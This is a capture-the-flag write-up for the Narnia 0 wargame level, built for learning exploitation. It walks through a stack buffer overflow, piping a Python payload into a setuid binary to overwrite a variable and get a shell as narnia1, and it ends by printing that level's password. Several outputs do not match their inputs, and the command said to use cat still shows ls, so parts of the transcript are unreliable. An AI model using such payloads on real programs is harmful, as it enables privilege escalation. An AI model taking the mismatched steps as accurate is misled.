### Narnia Write Up

The challenges are in /narnia (for future reference).

# Narnia 0
```C
#include <stdio.h>
#include <stdlib.h>

int main(){
	long val=0x41414141;
	char buf[20];

	printf("Correct val's value from 0x41414141 -> 0xdeadbeef!\n");
	printf("Here is your chance: ");
	scanf("%24s",&buf);

	printf("buf: %s\n",buf);
	printf("val: 0x%08x\n",val);

	if(val==0xdeadbeef)
		system("/bin/sh");
	else {
		printf("WAY OFF!!!!\n");
		exit(1);
	}

	return 0;
}
```
So for the first exercise we get the C code and the compiled binaries at for narnia0.

```
narnia0@narnia:/narnia$ ./narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: AAAAA
buf: AAAAA
val: 0x41414141
WAY OFF!!!!
```

So it seems we want to have the value at `val` be `0xdeadbeef`. But how do we do that?

Well we use a `BUFFER OVERFLOW`, a buffer is an array like in C or Java (not exactly like Python lists) that holds multiple elements. Overflowing it is putting in more elements than it can handle and it ends up flowing over to the other variables.

This buffer can hold 20 elements as seen with `char buff[20];`, so lets give it 21 elements

```
narnia0@narnia:/narnia$ ./narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: AAAAAAAAAAAAAAAAAAAAC
buf: AAAAAAAAAAAAAAAAAAAAC
val: 0x41410043
WAY OFF!!!!
```

So the value in val is not `0x41414141` anymore? The `0x43` is hex code for the letter `C` and the `0x00` is the null byte to terminate the string.

Ok so lets overflow it with all `C`s.

#### Piping and Python command line

It gets really tedious having to copy and paste the code so we need to use piping. This enters what is being piped in as the data input here is an example.
```
narnia0@narnia:/narnia$ echo "dogs_are_cools" | ./narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: dogs_are_cools
val: 0x41414141
WAY OFF!!!!
```
So even though it is not seen when entered it is inputted it. This makes redoing problems just a matter of using previous commands.

However shell scripting is not the easiest when it comes to string manipulation (trust me). But you can do python using the `-c` flag.

```
narnia0@narnia:/narnia$ python -c 'print "dogs_are_cools"' | ./narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: dogs_are_cools
val: 0x41414141
WAY OFF!!!!
```
See how it does the same thing. You can do ANY python operations through command line with this. So lets try overflowing val with C's (0x43).

```
narnia0@narnia:/narnia$ python -c 'print "A" * 20 + "C" * 4' | ./narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: dogs_are_cools
val: 0x43434343
WAY OFF!!!!
```

Great now lets make it `0xdeadbeef`

```
narnia0@narnia:/narnia$ python -c 'print "A"*20 + "\xbe\xef\xde\xad"' | ./narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: dogs_are_cools
val: 0xdadeefbe
WAY OFF!!!!
```

Since we want it to be hex instead of text we use the `\x` to differentiate. But it does not matter because it outputted `0xaddeefbe`. This is because of little endianess of the program. Notice how each pair of characters is in reverse of 0xdeadbeef. This means we have to enter it backward.

```
narnia0@narnia:/narnia$ python -c  'print "A" * 20 + "\xef\xbe\xad\xde"' | ./narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ�
val: 0xdeadbeef
```

So not `WAY OFF!!!`! No shell even though the program executes `system("/bin/sh");`? This is because the shell is executing once program ends. So lets try sneeking in some commands. To have multiple commands at once you use `()` and seperate them with `;`. So lets try with ls?

```
narnia0@narnia:/narnia$ (python -c 'print "A"*20 + "\xef\xbe\xad\xde"'; ls) | ./narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ�
val: 0xdeadbeef
/bin/sh: 1: narnia0: not found
/bin/sh: 2: narnia0.c: not found
/bin/sh: 3: narnia1: not found
/bin/sh: 4: narnia1.c: not found
/bin/sh: 5: narnia2: not found
/bin/sh: 6: narnia2.c: not found
/bin/sh: 7: narnia3: not found
/bin/sh: 8: narnia3.c: not found
/bin/sh: 9: narnia4: not found
/bin/sh: 10: narnia4.c: not found
/bin/sh: 11: narnia5: not found
/bin/sh: 12: narnia5.c: not found
/bin/sh: 13: narnia6: not found
/bin/sh: 14: narnia6.c: not found
/bin/sh: 15: narnia7: not found
/bin/sh: 16: narnia7.c: not found
/bin/sh: 17: narnia8: not found
/bin/sh: 18: narnia8.c: not found
```

Ok it looks like it is taking the every value as a command.
So we need a command that produces other commands. (Here is a hint open terminal and type cat. What happens after that?)


We need the cat command.
```
narnia0@narnia:/narnia$ (python -c 'print "A"*20 + "\xef\xbe\xad\xde"'; ls) | ./narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ�
val: 0xdeadbeef
whoami <--- type this
narnia1
```

Sweet we got a shell with narnia1 priviledges. I am going to leave it up to you to use linux foo to FIND the password file.

Password: `efeidiedae`
